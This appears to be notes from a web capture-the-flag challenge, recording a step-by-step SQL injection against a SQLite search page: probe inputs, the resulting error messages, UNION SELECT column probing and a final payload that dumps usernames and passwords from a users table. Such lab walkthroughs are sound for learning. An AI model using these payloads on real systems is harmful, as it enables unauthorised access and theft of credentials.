a' a
'
Warning: SQLite3::query(): Unable to prepare statement: 1, near "a": syntax error in /challenge/web-serveur/ch19/index.php on line 150
near "a": syntax error


SELECT ? FROM ? WHERE Search = "<user input>";

a'" a; --
'
Warning: SQLite3::query(): Unable to prepare statement: 1, near "" a; --%' or description like '%a'"": syntax error in /challenge/web-serveur/ch19/index.php on line 150
near "" a; --%' or description like '%a'"": syntax error


SELECT ? FROM ? WHERE Search = "<user input>%" or description like "%<user input>"


a' union select 1,2,3 from users; -- 
'
Warning: SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in /challenge/web-serveur/ch19/index.php on line 150
SELECTs to the left and right of UNION do not have the same number of result columns


a' union select 1,2 from users; -- 
'


a' union select username, password from users; -- 
'
3 result(s) for "a' union select username, password from users; -- "

admin (c4K04dtIaJsuWdi)
user1 (OK4dSoYE)
user2 (8Wbhkzmd)